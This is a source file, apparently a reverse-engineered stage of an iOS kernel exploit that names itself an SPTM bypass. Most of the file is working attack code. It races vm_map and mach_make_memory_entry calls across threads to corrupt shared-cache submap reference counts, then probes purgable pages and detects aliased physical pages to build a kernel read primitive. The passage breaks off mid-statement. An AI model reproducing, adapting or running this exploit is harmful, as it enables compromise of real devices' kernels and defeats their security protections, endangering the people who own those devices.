#include <mach/mach.h>
#include <mach/vm_map.h>
#include "kread_bootstrap.h"
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <stdatomic.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>
#include <dlfcn.h>
#include <fcntl.h>
#import <Foundation/Foundation.h>

extern vm_size_t vm_page_size;
extern int vm_page_shift;

#pragma mark - Logging

static char g_kread_log[262144];
static int g_kread_log_off;
static int g_log_fd = -1;
static int g_log_started_fresh = 1;

static char g_log_path[256];

static void klog_find_path(void) {
    if (g_log_path[0]) return;

    NSString *bundlePath = [[NSBundle mainBundle] bundlePath];
    char bundleLog[256] = {0};
    if (bundlePath)
        snprintf(bundleLog, sizeof(bundleLog), "%s/sptm_bypass.log", bundlePath.UTF8String);

    NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    char docLog[256] = {0};
    if (docs) {
        [[NSFileManager defaultManager] createDirectoryAtPath:docs
                withIntermediateDirectories:YES attributes:nil error:nil];
        snprintf(docLog, sizeof(docLog), "%s/sptm_bypass.log", docs.UTF8String);
    }

    const char *candidates[8] = {0};
    int n = 0;
    if (bundleLog[0]) candidates[n++] = bundleLog;
    if (docLog[0]) candidates[n++] = docLog;
    candidates[n++] = "/var/mobile/sptm_bypass.log";
    candidates[n++] = "/var/tmp/sptm_bypass.log";
    candidates[n++] = "/tmp/sptm_bypass.log";

    NSMutableString *errs = [NSMutableString string];
    for (int i = 0; i < n; i++) {
        int fd = open(candidates[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd >= 0) {
            close(fd);
            snprintf(g_log_path, sizeof(g_log_path), "%s", candidates[i]);
            NSLog(@"[klog] path: %s", candidates[i]);
            return;
        }
        [errs appendFormat:@"%s: errno=%d; ", candidates[i], errno];
    }
    snprintf(g_log_path, sizeof(g_log_path), "FAILED: %s", errs.UTF8String);
    NSLog(@"[klog] all paths failed: %@", errs);
}

static void klog_open(void) {
    if (g_log_fd >= 0) return;
    klog_find_path();
    if (!g_log_path[0] || strncmp(g_log_path, "FAILED", 6) == 0) return;
    g_log_fd = open(g_log_path, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (g_log_fd >= 0) {
        struct stat st;
        g_log_started_fresh = (fstat(g_log_fd, &st) == 0 && st.st_size == 0) ? 1 : 0;
    }
}

const char *kread_bootstrap_get_log_path(void) { return g_log_path; }
void kread_bootstrap_open_log(void) {
    klog_open();
}

int kread_bootstrap_log_is_fresh(void) { return g_log_started_fresh; }

void kread_bootstrap_clear_log(void) {
    if (g_log_fd >= 0) { ftruncate(g_log_fd, 0); lseek(g_log_fd, 0, SEEK_SET); }
    g_log_started_fresh = 1;
}

void kread_bootstrap_log_write(const void *buf, int len) {
    if (!buf || len <= 0) return;
    if (g_log_fd < 0) klog_open();
    if (g_log_fd >= 0) {
        write(g_log_fd, buf, (size_t)len);
        fcntl(g_log_fd, F_FULLFSYNC);
    }
}

static void (*g_kread_ui_log_cb)(const char *line, int len) = NULL;

void kread_bootstrap_set_ui_log_callback(void (*cb)(const char *line, int len)) {
    g_kread_ui_log_cb = cb;
}

static void klog(const char *fmt, ...) {
    char line[512];
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(line, sizeof(line), fmt, args);
    va_end(args);
    if (n <= 0) return;
    if (n >= (int)sizeof(line)) n = (int)sizeof(line) - 1;
    int remain = sizeof(g_kread_log) - g_kread_log_off;
    if (remain > 1) {
        int c = (n < remain - 1) ? n : remain - 1;
        memcpy(g_kread_log + g_kread_log_off, line, c);
        g_kread_log_off += c;
        g_kread_log[g_kread_log_off] = 0;
    }
    if (g_log_fd >= 0) {
        write(g_log_fd, line, n);
        fcntl(g_log_fd, F_FULLFSYNC);
    }
    NSLog(@"%s", line);

    if (g_kread_ui_log_cb) g_kread_ui_log_cb(line, n);
}

const char *kread_bootstrap_get_log(void) { return g_kread_log; }

#pragma mark - Outer context (v2 in binary, ~18KB)

#define RACE_SLOT_SIZE   688
#define RACE_SLOT_COUNT  16
#define RACE_OUT_OFF     16

#define RO_BASE          0
#define RO_ALLOC_SIZE    8
#define RO_VM_SIZE       16
#define RO_MASK          24
#define RO_PAGE_COUNT    32
#define RO_MEM_ENTRY     36
#define RO_CANDIDATES    48
#define RO_PROBES        176

#define OC_MODE              0
#define OC_CONFIG            8
#define OC_KPTR              11280
#define OC_ALIASED_PAGE      11288
#define OC_HEAP_BUF          11296
#define OC_HEAP_SIZE         11304
#define OC_OOL_BASE          11312
#define OC_OOL_SIZE          11320
#define OC_SPRAY_PORTS       11328
#define OC_PORT_IDX          12352
#define OC_PORT_COUNTS       12356
#define OC_MAP_ENTRY_PTR     13384
#define OC_MAP_BACKUP1       13392
#define OC_MAP_HDR_PTR       13400
#define OC_MAP_BACKUP2       13408
#define OC_KREAD_COUNT       13416
#define OC_MEM_ENTRY_PORT    13424
#define OC_PORT_ARRAY        13432
#define OC_PORT_ARRAY_CNT    13440
#define OC_VM_REGION_BASE    13448
#define OC_VM_REGION_SIZE    13456
#define OC_TEMP_BUF          13464
#define OC_TEMP_BUF_SIZE     13472
#define OC_REPLY_PORTS       13480
#define OC_VERSION_FIELD     13544
#define OC_ELEM_SIZE         13548
#define OC_FOUND_MEM_ENTRY   13552
#define OC_FOUND_KPTR_BASE   13560
#define OC_RAND_COOKIE1      13584
#define OC_RAND_COOKIE2      13592
#define OC_EXTRA_PORTS       13600
#define OC_EXTRA_PORT_CNT    13856
#define OC_SUBMAP_BASE       13864
#define OC_SUBMAP_SIZE       13872
#define OC_RACE_PARAM        13880
#define OC_SYNC_FLAG         13884
#define OC_SYNC_COUNT        13888
#define OC_THREAD_LOOPS      13896
#define OC_THREAD_LAST_KR    13904
#define OC_RACE_DELTA        13908
#define OC_RACE_SLOT         13912
#define OC_ALLOC_IDX         26184
#define OC_ALLOC_PAGES       17992
#define OC_ALLOC_ENTRIES     13892
#define OC_SIZE              28000

#define STAB_MAX_RACED 16
static struct { uint64_t obj_id; uint64_t base; uint32_t delta; } g_raced_objs[STAB_MAX_RACED];
static int g_raced_count = 0;
int      kread_bootstrap_get_raced_count(void)   { return g_raced_count; }
uint64_t kread_bootstrap_get_raced_obj_id(int i) { return (i >= 0 && i < g_raced_count) ? g_raced_objs[i].obj_id : 0; }
uint64_t kread_bootstrap_get_raced_base(int i)   { return (i >= 0 && i < g_raced_count) ? g_raced_objs[i].base   : 0; }
uint32_t kread_bootstrap_get_raced_delta(int i)  { return (i >= 0 && i < g_raced_count) ? g_raced_objs[i].delta  : 0; }

#define OC_U8(ctx, off)  (*(uint8_t  *)((char *)(ctx) + (off)))
#define OC_U32(ctx, off) (*(uint32_t *)((char *)(ctx) + (off)))
#define OC_U64(ctx, off) (*(uint64_t *)((char *)(ctx) + (off)))
#define OC_I32(ctx, off) (*(int32_t  *)((char *)(ctx) + (off)))
#define OC_ATOMIC_U8(ctx, off)  (*(_Atomic uint8_t  *)((char *)(ctx) + (off)))
#define OC_ATOMIC_U32(ctx, off) (*(_Atomic uint32_t *)((char *)(ctx) + (off)))
#define OC_ATOMIC_U64(ctx, off) (*(_Atomic uint64_t *)((char *)(ctx) + (off)))

#define RO_U32(ro, off) (*(uint32_t *)((char *)(ro) + (off)))
#define RO_U64(ro, off) (*(uint64_t *)((char *)(ro) + (off)))

#pragma mark - Inner context (v3 in binary)

#define IC_FLAGS         0
#define IC_KREAD_FN      48
#define IC_OUTER_CTX     80
#define IC_VERSION       320
#define IC_KERNEL_VER    344
#define IC_KOBJECT_OFF   360
#define IC_VALIDATE_OFF  376
#define IC_PAGE_ALIGN    384
#define IC_PAGE_MASK     392
#define IC_SEMAPHORE     612
#define IC_SIZE          8192

#define IC_U8(ctx, off)  (*(uint8_t  *)((char *)(ctx) + (off)))
#define IC_U32(ctx, off) (*(uint32_t *)((char *)(ctx) + (off)))
#define IC_U64(ctx, off) (*(uint64_t *)((char *)(ctx) + (off)))

static uint8_t g_inner_ctx[IC_SIZE];
static uint8_t *g_outer_ctx;

#pragma mark - sub_BCB4: get obj_id_full via vm_region_recurse_64

static uint64_t get_obj_id_full(vm_address_t addr) {
    vm_address_t address = addr;
    vm_size_t size = 0;
    natural_t nesting_depth = 0;
    natural_t info[19];
    mach_msg_type_number_t cnt = 19;
    memset(info, 0, sizeof(info));
    if (vm_region_recurse_64(mach_task_self_, &address, &size,
            &nesting_depth, (vm_region_recurse_info_t)info, &cnt))
        return 0;
    return *(uint64_t *)&info[17];
}

#pragma mark - sub_BE20: vm_map with retry

static kern_return_t vm_map_retry(vm_address_t *addr, vm_size_t size,
        vm_address_t mask, int flags, int retries) {
    for (int i = 0; i <= retries; i++) {
        vm_address_t address = *addr;
        kern_return_t kr = vm_map(mach_task_self_, &address, size, mask,
                flags, 0, 0, 0, VM_PROT_READ | VM_PROT_WRITE,
                VM_PROT_ALL, VM_INHERIT_COPY);
        if (kr == KERN_SUCCESS) {
            *addr = address;
            return KERN_SUCCESS;
        }
        if (i == retries) return kr;
    }
    return KERN_FAILURE;
}

#pragma mark - sub_1F0D8: get CPU count

static int get_cpu_count(void) {
    int ncpu = 1;
    size_t len = sizeof(ncpu);
    sysctlbyname("hw.ncpu", &ncpu, &len, NULL, 0);
    return ncpu;
}

#pragma mark - sub_BD20: allocate page matching obj_id

static kern_return_t alloc_matching_page(uint8_t *oc, vm_size_t size,
        uint64_t target_obj_id, mach_port_t *out_entry) {
    uint32_t *idx = (uint32_t *)((char *)oc + OC_ALLOC_IDX);
    for (int tries = 0; tries < 256; tries++) {
        if (*idx > 0x3FF) return 3;
        uint32_t cur = *idx;
        vm_address_t *slot = (vm_address_t *)((char *)oc + OC_ALLOC_PAGES + 8 * cur);
        kern_return_t kr = vm_allocate(mach_task_self_, slot, size,
                VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE);
        if (kr) return kr;
        (*idx)++;
        uint64_t oid = get_obj_id_full(*slot);
        if (!oid) return 5;
        if (oid == target_obj_id) {
            vm_size_t entry_size = size;
            *out_entry = 0;
            kr = mach_make_memory_entry(mach_task_self_, &entry_size,
                    *slot, VM_PROT_READ | VM_PROT_WRITE | 0x1,
                    out_entry, 0);
            if (kr == KERN_SUCCESS)
                *(uint32_t *)((char *)oc + OC_ALLOC_ENTRIES + 4 * cur) = *out_entry;
            return kr;
        }
    }
    return 3;
}

#pragma mark - Find shared cache submap region

static void find_submap_region(uint8_t *oc, unsigned int num_pages) {
    if (OC_U64(oc, OC_SUBMAP_BASE) && OC_U64(oc, OC_SUBMAP_SIZE))
        return;

    vm_address_t address = 0;
    vm_size_t size = 0;
    natural_t depth = 1;
    natural_t info[19];
    mach_msg_type_number_t cnt = 19;
    vm_size_t needed = vm_page_size * num_pages + 2 * vm_page_size;

    while (1) {
        memset(info, 0, sizeof(info));
        cnt = 19;
        depth = 1;
        kern_return_t kr = vm_region_recurse_64(mach_task_self_, &address,
                &size, &depth, (vm_region_recurse_info_t)info, &cnt);
        if (kr) return;
        if (depth > 1) return;
        if (depth == 1 && size >= needed &&
                *(uint64_t *)((char *)info + 12) == 0)
            break;
        address += size;
    }

    OC_U64(oc, OC_SUBMAP_BASE) = address;
    size = needed;
    atomic_store((_Atomic uint64_t *)((char *)oc + OC_SUBMAP_SIZE), needed);
}

#pragma mark - sub_BBF4: race thread

static void *race_thread_fn(void *arg) {
    uint8_t *oc = (uint8_t *)arg;
    vm_size_t submap_size = (vm_size_t)atomic_load(
            (_Atomic uint64_t *)((char *)oc + OC_SUBMAP_SIZE));
    uint32_t mem_entry = atomic_load(
            (_Atomic uint32_t *)((char *)oc + OC_RACE_PARAM));
    if (!submap_size || !mem_entry)
        return NULL;

    atomic_fetch_add((_Atomic uint32_t *)((char *)oc + OC_SYNC_COUNT), 1);

    _Atomic uint8_t *stop_flag = (_Atomic uint8_t *)((char *)oc + OC_SYNC_FLAG);
    _Atomic uint64_t *loop_cnt = (_Atomic uint64_t *)((char *)oc + OC_THREAD_LOOPS);
    _Atomic uint32_t *last_kr = (_Atomic uint32_t *)((char *)oc + OC_THREAD_LAST_KR);
    while (1) {
        uint8_t sf = atomic_load(stop_flag);
        if (sf & 1) break;
        vm_address_t address = 0;
        kern_return_t kr = vm_map(mach_task_self_, &address, submap_size,
                0, 0, mem_entry, 0, TRUE, VM_PROT_READ, VM_PROT_READ,
                VM_INHERIT_COPY);
        atomic_fetch_add(loop_cnt, 1);
        atomic_store(last_kr, (uint32_t)kr);
        if (kr != KERN_INVALID_ADDRESS) break;
    }
    return NULL;
}

#pragma mark - sub_BED0: shared cache race (simplified core)

static kern_return_t shared_cache_race(uint8_t *ic, uint8_t *oc,
        unsigned int num_pages, uint8_t *race_output) {
    vm_size_t page_sz = vm_page_size;
    int ncpu = get_cpu_count();
    unsigned int nthreads;
    int max_iters;

    if (ncpu >= 3 && ncpu > 5) {
        nthreads = 4;
        max_iters = 100;
    } else if (ncpu < 3) {
        nthreads = 1;
        max_iters = 200;
    } else {
        nthreads = ncpu - 1;
        if (nthreads > 3) {
            nthreads = 4;
            max_iters = 100;
        } else {
            max_iters = 200;
        }
    }

    find_submap_region(oc, num_pages);
    uint64_t submap_base = OC_U64(oc, OC_SUBMAP_BASE);
    uint64_t submap_size = OC_U64(oc, OC_SUBMAP_SIZE);
    if (!submap_base || !submap_size) {
        klog("[race] submap not found\n");
        return 5;
    }
    klog("[race] submap: 0x%llx size=0x%llx\n",
            (unsigned long long)submap_base,
            (unsigned long long)submap_size);

    vm_size_t region_size = page_sz * num_pages;
    klog("[race] ncpu=%d threads=%u iters=%d region=0x%llx\n",
            ncpu, nthreads, max_iters,
            (unsigned long long)region_size);

    for (int iter = 0; iter < max_iters; iter++) {
        pthread_t threads[8] = {0};
        mach_port_t mem_entries[8] = {0};
        vm_address_t probes[64] = {0};
        vm_address_t mapped_addr = 0;
        vm_address_t remap_addr = 0;
        mach_port_t race_entry = 0;

        OC_ATOMIC_U8(oc, OC_SYNC_FLAG) = 0;
        OC_ATOMIC_U32(oc, OC_SYNC_COUNT) = 0;

        if (iter == 0) klog("[race] iter0: creating mem entry from submap...\n");
        vm_size_t entry_size = submap_size;
        kern_return_t kr = mach_make_memory_entry_64(mach_task_self_,
                (memory_object_size_t *)&entry_size,
                submap_base, VM_PROT_READ,
                &mem_entries[0], 0);
        if (kr || entry_size != submap_size) {
            if (iter == 0) klog("[race] mem_entry_64 failed: kr=0x%x size=0x%llx vs 0x%llx\n",
                    kr, (unsigned long long)entry_size, (unsigned long long)submap_size);
            goto next_iter;
        }

        for (unsigned int t = 1; t < nthreads; t++) {
            entry_size = submap_size;
            kr = mach_make_memory_entry_64(mach_task_self_,
                    (memory_object_size_t *)&entry_size,
                    submap_base, VM_PROT_READ,
                    &mem_entries[t], 0);
            if (kr || entry_size != submap_size) {
                if (iter == 0) klog("[race] child entry %u failed: kr=0x%x sz=0x%llx\n",
                        t, kr, (unsigned long long)entry_size);
                goto next_iter;
            }
        }

        OC_ATOMIC_U32(oc, OC_RACE_PARAM) = mem_entries[0];

        {
            vm_address_t addr = 0;
            kr = vm_map(mach_task_self_, &addr, submap_size,
                    0, VM_FLAGS_ANYWHERE, mem_entries[0], 0,
                    FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_COPY);
            if (kr) {
                if (iter == 0) klog("[race] vm_map(ANY,F) failed: 0x%x\n", kr);
                goto next_iter;
            }
            mapped_addr = addr;
        }

        {
            remap_addr = 0;
            kr = vm_map_retry(&remap_addr, page_sz + submap_size,
                    0x1FFFFFF, VM_FLAGS_ANYWHERE | 0x8, 0x10);
            if (kr) {
                if (iter == 0) klog("[race] remap alloc failed: 0x%x\n", kr);
                goto next_iter;
            }
        }

        {
            kr = vm_copy(mach_task_self_, mapped_addr, submap_size, remap_addr);
            if (kr) {
                if (iter == 0) klog("[race] vm_copy failed: 0x%x\n", kr);
                goto next_iter;
            }
        }

        {
            kr = vm_deallocate(mach_task_self_, mapped_addr, submap_size);
            mapped_addr = 0;
            if (kr) goto next_iter;
        }

        {
            vm_address_t guard = remap_addr + submap_size;
            kr = vm_allocate(mach_task_self_, &guard, page_sz, 0x6004000);
            if (kr) goto next_iter;
            kr = vm_deallocate(mach_task_self_, guard, page_sz);
            if (kr) goto next_iter;
        }

        uint32_t ref_before;
        {
            vm_address_t check_addr = remap_addr;
            vm_size_t check_size = 0;
            natural_t check_depth = 0;
            natural_t check_info[19] = {0};
            mach_msg_type_number_t check_cnt = 19;
            kr = vm_region_recurse_64(mach_task_self_, &check_addr, &check_size,
                    &check_depth, (vm_region_recurse_info_t)check_info, &check_cnt);
            if (kr) goto next_iter;
            ref_before = check_info[10];
            if (iter == 0) klog("[race] ref_before=%u obj_id=0x%llx\n",
                    ref_before, (unsigned long long)*(uint64_t *)&check_info[17]);
        }

        OC_ATOMIC_U64(oc, OC_THREAD_LOOPS) = 0;
        OC_ATOMIC_U32(oc, OC_THREAD_LAST_KR) = 0;
        for (unsigned int t = 0; t < nthreads; t++) {
            if (pthread_create(&threads[t], NULL, race_thread_fn, oc))
                goto next_iter;
        }

        while (atomic_load((_Atomic uint32_t *)((char *)oc + OC_SYNC_COUNT))
                != nthreads) {
            mach_timespec_t ts = {0, 1000000};
            semaphore_timedwait(*(semaphore_t *)(ic + IC_SEMAPHORE), ts);
        }

        {
            memory_object_size_t me_size = submap_size;
            kr = mach_make_memory_entry_64(mach_task_self_, &me_size,
                    0, VM_PROT_READ, &race_entry, mem_entries[0]);
            if (kr || (vm_size_t)me_size != submap_size) {
                if (iter == 0) klog("[race] race entry failed: 0x%x\n", kr);
                goto next_iter;
            }
        }

        atomic_store((_Atomic uint8_t *)((char *)oc + OC_SYNC_FLAG), 1);
        for (unsigned int t = 0; t < nthreads; t++) {
            if (threads[t]) { pthread_join(threads[t], NULL); threads[t] = 0; }
        }

        {
            uint64_t tloops = atomic_load((_Atomic uint64_t *)((char *)oc + OC_THREAD_LOOPS));
            uint32_t tkr = atomic_load((_Atomic uint32_t *)((char *)oc + OC_THREAD_LAST_KR));
            if (iter == 0)
                klog("[race] i%d: %llu loops kr=0x%x\n",
                        iter, (unsigned long long)tloops, tkr);
        }

        {
            vm_address_t check_addr = remap_addr;
            vm_size_t check_size = 0;
            natural_t check_depth = 0;
            natural_t check_info[19] = {0};
            mach_msg_type_number_t check_cnt = 19;
            kr = vm_region_recurse_64(mach_task_self_, &check_addr, &check_size,
                    &check_depth, (vm_region_recurse_info_t)check_info, &check_cnt);
            if (kr) goto next_iter;

            uint32_t ref_after = check_info[10];
            uint64_t obj_id = *(uint64_t *)&check_info[17];
            uint32_t expected = ref_before + 1;

            if (iter == 0 || ref_after != expected)
                klog("[race] i%d: ref %u->%u (exp %u)\n",
                        iter, ref_before, ref_after, expected);

            if (ref_after < expected - nthreads || ref_after > expected) {
                goto next_iter;
            }
            if (ref_after == expected) {
                goto next_iter;
            }
            klog("[race] RACE WON iter %d ref %u->%u (expected %u)\n",
                    iter, ref_before, ref_after, expected);

            {
                uint32_t delta = expected - ref_after;
                uint32_t dealloc_count = nthreads - delta + 1;
                OC_U32(oc, OC_RACE_DELTA) = delta;
                klog("[race] delta=%u dealloc_count=%u/%u parent entries\n",
                        delta, dealloc_count, nthreads);
                for (uint32_t d = 0; d < dealloc_count && d < nthreads; d++) {
                    if (mem_entries[d]) {
                        mach_port_deallocate(mach_task_self_, mem_entries[d]);
                        mem_entries[d] = 0;
                    }
                }
                for (uint32_t d = dealloc_count; d < nthreads; d++) {
                    if (mem_entries[d]) {
                        uint32_t ecnt = OC_U32(oc, OC_EXTRA_PORT_CNT);
                        OC_U32(oc, OC_EXTRA_PORTS + 4 * ecnt) = mem_entries[d];
                        OC_U32(oc, OC_EXTRA_PORT_CNT) = ecnt + 1;
                        mem_entries[d] = 0;
                    }
                }
            }

            uint64_t target_oid = *(uint64_t *)&check_info[17];
            uint64_t track_oid = target_oid;
            int boundary_count = 0;
            uint32_t pa = IC_U32(ic, IC_PAGE_ALIGN);
            klog("[post] target_oid=0x%llx pa=0x%x\n",
                    (unsigned long long)target_oid, pa);
            klog("[post] probe loop start\n");
            for (int p = 0; p < 64; p++) {
                klog("[post] vm_allocate probe %d...\n", p);
                kr = vm_allocate(mach_task_self_, &probes[p], page_sz,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE);
                if (kr) { klog("[post] probe %d: vm_alloc FAIL 0x%x\n", p, kr); break; }
                klog("[post] get_obj_id probe %d addr=0x%llx...\n", p,
                        (unsigned long long)probes[p]);
                uint64_t probe_oid = get_obj_id_full(probes[p]);
                if (!probe_oid) { klog("[post] probe %d: obj_id=0 FAIL\n", p); break; }
                klog("[post] probe %d: oid=0x%llx\n", p, (unsigned long long)probe_oid);

                uint64_t d1_min = (probe_oid < track_oid) ? probe_oid : track_oid;
                uint64_t d1_max = (probe_oid > track_oid) ? probe_oid : track_oid;
                uint64_t d2_min = (probe_oid < target_oid) ? probe_oid : target_oid;
                uint64_t d2_max = (probe_oid > target_oid) ? probe_oid : target_oid;

                int is_boundary = (d1_max - d1_min >= pa) || (d2_max - d2_min >= pa);
                if (is_boundary) {
                    if (!boundary_count && p > 0) {
                        goto race_success;
                    }
                    boundary_count++;
                    track_oid = probe_oid;
                    target_oid = probe_oid;
                } else {
                    track_oid = d1_min;
                }

                if (boundary_count >= 2) {
                    uint64_t orig_oid = *(uint64_t *)&check_info[17];
                    uint64_t od_min = (probe_oid < orig_oid) ? probe_oid : orig_oid;
                    uint64_t od_max = (probe_oid > orig_oid) ? probe_oid : orig_oid;
                    if (od_max - od_min >= pa) {
                        goto race_success;
                    }
                }
            }
            goto next_iter;

race_success:
            RO_U64(race_output, RO_BASE) = remap_addr;
            if (g_raced_count < STAB_MAX_RACED) {
                g_raced_objs[g_raced_count].obj_id = *(uint64_t *)&check_info[17];
                g_raced_objs[g_raced_count].base   = remap_addr;
                g_raced_objs[g_raced_count].delta  = OC_U32(oc, OC_RACE_DELTA);
                g_raced_count++;
            }
            RO_U64(race_output, RO_ALLOC_SIZE) = page_sz * num_pages;
            RO_U64(race_output, RO_VM_SIZE) = region_size;
            RO_U32(race_output, RO_PAGE_COUNT) = num_pages;

            for (unsigned int pg = 0; pg < num_pages; pg++)
                *(uint64_t *)(remap_addr + page_sz * pg) =
                        OC_U64(oc, OC_RAND_COOKIE2);
            for (int j = 0; j < 64; j++)
                if (probes[j])
                    RO_U64(race_output, RO_PROBES + j * 8) = probes[j];

            klog("[race] RACE SUCCESS iter %d ref %u->%u base=0x%llx\n",
                    iter, ref_before, ref_after,
                    (unsigned long long)remap_addr);

            {
                vm_address_t rc_addr = remap_addr;
                vm_size_t rc_size = 0;
                natural_t rc_depth = 0;
                natural_t rc_info[19] = {0};
                mach_msg_type_number_t rc_cnt = 19;
                kern_return_t rc_kr = vm_region_recurse_64(mach_task_self_,
                        &rc_addr, &rc_size, &rc_depth,
                        (vm_region_recurse_info_t)rc_info, &rc_cnt);
                if (!rc_kr) {
                    klog("[diag] post-cookie ref=%u oid=0x%llx (was ref=%u)\n",
                            rc_info[10],
                            (unsigned long long)*(uint64_t *)&rc_info[17],
                            ref_after);
                } else {
                    klog("[diag] post-cookie vm_region FAILED 0x%x\n", rc_kr);
                }
            }

            if (race_entry) {
                mach_port_deallocate(mach_task_self_, race_entry);
                race_entry = 0;
            }

            {
                uint64_t raced_oid = *(uint64_t *)&check_info[17];
                mach_port_t bd20_entry = 0;
                kern_return_t bd20_kr = alloc_matching_page(oc, submap_size,
                        raced_oid, &bd20_entry);
                if (!bd20_kr) {
                    RO_U32(race_output, RO_MEM_ENTRY) = bd20_entry;
                    klog("[race] sub_BD20 OK: entry=0x%x\n", bd20_entry);
                } else {
                    klog("[race] sub_BD20 failed: 0x%x\n", bd20_kr);
                }
            }

            {
                uint64_t cookie = OC_U64(oc, OC_RAND_COOKIE2);
                klog("[diag] cookie=0x%llx base=0x%llx pages=%u\n",
                        (unsigned long long)cookie,
                        (unsigned long long)remap_addr, num_pages);
                for (unsigned int dp = 0; dp < num_pages && dp < 4; dp++) {
                    uint64_t val = *(uint64_t *)(remap_addr + page_sz * dp);
                    uint64_t oid = get_obj_id_full(remap_addr + page_sz * dp);
                    klog("[diag] page[%u] val=0x%llx oid=0x%llx %s\n",
                            dp, (unsigned long long)val,
                            (unsigned long long)oid,
                            (val == cookie) ? "=cookie" : "DIFFERS");
                }
            }

            for (int j = 0; j < 64; j++) {
                if (probes[j]) {
                    RO_U64(race_output, RO_PROBES + j * 8) = probes[j];
                    probes[j] = 0;
                }
            }

            klog("[race] returning SUCCESS\n");
            return 0;
        }

next_iter:
        atomic_store((_Atomic uint8_t *)((char *)oc + OC_SYNC_FLAG), 1);
        for (unsigned int t = 0; t < nthreads; t++) {
            if (threads[t]) { pthread_join(threads[t], NULL); threads[t] = 0; }
        }
        for (int p = 0; p < 64; p++) {
            if (probes[p]) {
                vm_deallocate(mach_task_self_, probes[p], page_sz); probes[p] = 0;
            }
        }
        if (mapped_addr) {
            vm_deallocate(mach_task_self_, mapped_addr, submap_size); mapped_addr = 0;
        }
        if (remap_addr) {
            vm_deallocate(mach_task_self_, remap_addr, submap_size); remap_addr = 0;
        }
        if (race_entry) {
            mach_port_deallocate(mach_task_self_, race_entry); race_entry = 0;
        }
        for (unsigned int t = 0; t < nthreads; t++) {
            if (mem_entries[t]) {
                mach_port_deallocate(mach_task_self_, mem_entries[t]); mem_entries[t] = 0;
            }
        }
    }

    klog("[race] exhausted %d iterations\n", max_iters);
    return 5;
}

#pragma mark - sub_FAE4: detect aliased pages

static kern_return_t detect_aliased_pages(uint8_t *oc, uint8_t *race_output) {
    vm_size_t page_sz = vm_page_size;
    uint64_t config = OC_U64(oc, OC_CONFIG);
    uint64_t max_iters;
    if ((config >> 34) != 0)       max_iters = 0x200000;
    else if ((config >> 33) != 0)  max_iters = 0x100000;
    else if ((config >> 32) != 0)  max_iters = 0x80000;
    else                           max_iters = 0x40000;

    uint64_t rand_cookie;
    arc4random_buf(&rand_cookie, 8);

    vm_address_t vm_region = OC_U64(oc, OC_VM_REGION_BASE);
    vm_size_t vm_region_sz = OC_U64(oc, OC_VM_REGION_SIZE);
    if (!vm_region || !vm_region_sz) {
        klog("[alias] vm_region not set up\n");
        return 708609;
    }

    uint64_t race_base = RO_U64(race_output, RO_BASE);
    uint32_t page_count = RO_U32(race_output, RO_PAGE_COUNT);
    uint64_t mask = RO_U64(race_output, RO_MASK);

    madvise((void *)(vm_region + vm_region_sz - page_sz), page_sz, MADV_WILLNEED);
    vm_size_t alloc_sz = vm_region_sz - page_sz;

    vm_address_t address = vm_region;
    kern_return_t kr = vm_allocate(mach_task_self_, &address, alloc_sz,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | (0xCA << 24));
    if (kr) {
        klog("[alias] initial vm_allocate failed 0x%x\n", kr);
        return kr | 0x80000000;
    }

    kern_return_t result = 708625;
    klog("[alias] start: vm_region=0x%llx race_base=0x%llx pages=%u max=%llu\n",
            (unsigned long long)vm_region, (unsigned long long)race_base,
            page_count, (unsigned long long)max_iters);

    {
        uint64_t cookie = OC_U64(oc, OC_RAND_COOKIE2);
        klog("[alias] cookie=0x%llx mask=0x%llx\n",
                (unsigned long long)cookie, (unsigned long long)mask);
        for (uint32_t dp = 0; dp < page_count && dp < 4; dp++) {
            uint64_t val = *(uint64_t *)(race_base + page_sz * dp);
            klog("[alias] pre[%u] val=0x%llx %s\n", dp,
                    (unsigned long long)val,
                    (val == cookie) ? "=cookie" :
                    (val == 0) ? "=ZERO" : "OTHER");
        }
    }

    for (uint64_t attempt = 0; attempt < max_iters; attempt++) {
        uint64_t slot_idx = attempt & 0x7F;

        if (attempt > 0 && slot_idx == 0) {
            address = vm_region;
            kr = vm_allocate(mach_task_self_, &address, alloc_sz,
                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | (0xCA << 24));
            if (kr) return kr | 0x80000000;
        }

        uint64_t probe_val = rand_cookie + attempt;
        *(uint64_t *)(vm_region + page_sz * slot_idx) = probe_val;
        __asm__ volatile("dsb ish" ::: "memory");

        if (!page_count) goto count_bits;
        for (uint32_t pg = 0; pg < page_count; pg++) {
            if ((mask >> pg) & 1) continue;
            uint64_t page_val = *(uint64_t *)(race_base + page_sz * pg);

            if (page_val == probe_val) {
                mask |= (1ULL << pg);
                RO_U64(race_output, RO_MASK) = mask;
                vm_size_t entry_size = page_sz;
                mach_port_t entry = 0;
                kr = mach_make_memory_entry(mach_task_self_,
                        &entry_size, vm_region + page_sz * slot_idx,
                        VM_PROT_READ | VM_PROT_WRITE | MAP_MEM_VM_COPY,
                        &entry, 0);
                if (kr) {
                    klog("[alias] mem_entry failed 0x%x\n", kr);
                    return kr | 0x80000000;
                }
                RO_U32(race_output, RO_MEM_ENTRY) = entry;
                result = 0;
                klog("[alias] MATCH page %u at attempt %llu\n",
                        pg, (unsigned long long)attempt);
                goto count_bits;
            }

            if (page_val != OC_U64(oc, OC_RAND_COOKIE2)) {
                mask |= (1ULL << pg);
                RO_U64(race_output, RO_MASK) = mask;
            }
        }

count_bits:;
        int bits_set = __builtin_popcountll(mask);
        if ((uint32_t)bits_set == page_count || result == 0) return result;
    }
    {
        uint64_t cookie = OC_U64(oc, OC_RAND_COOKIE2);
        int cookie_count = 0, zero_count = 0, other_count = 0;
        for (uint32_t dp = 0; dp < page_count; dp++) {
            uint64_t val = *(uint64_t *)(race_base + page_sz * dp);
            if (val == cookie) cookie_count++;
            else if (val == 0) zero_count++;
            else other_count++;
        }
        klog("[alias] EXHAUSTED %llu iters. pages: %d=cookie %d=zero %d=other (mask=0x%llx)\n",
                (unsigned long long)max_iters,
